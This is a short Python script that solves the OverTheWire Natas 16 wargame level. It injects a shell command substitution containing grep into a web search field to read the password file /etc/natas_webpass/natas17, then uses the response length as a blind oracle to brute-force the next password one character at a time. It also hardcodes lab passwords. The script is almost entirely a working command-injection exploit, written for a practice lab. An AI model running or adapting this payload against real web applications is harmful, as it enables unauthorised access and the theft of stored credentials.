#!/bin/usr/bin/python3

import requests
import string

chars='0123456789'+ string.ascii_uppercase + string.ascii_lowercase
url = 'http://natas16.natas.labs.overthewire.org/?needle=1&submit=Search'
username='natas16'
password_16="TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"
password_17="XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"

while len(password_17) <33 :
    for i in chars :
        needle="$(grep ^"+ password_17+i+ " /etc/natas_webpass/natas17)"
        print("Testing :" + needle)
        x = requests.post(url, data ={'needle':needle}, auth = (username,password_16))
        if  len(x.text) <=1200:
            print("We Found " + i)
            password_17+=i
            break

print(password_17)

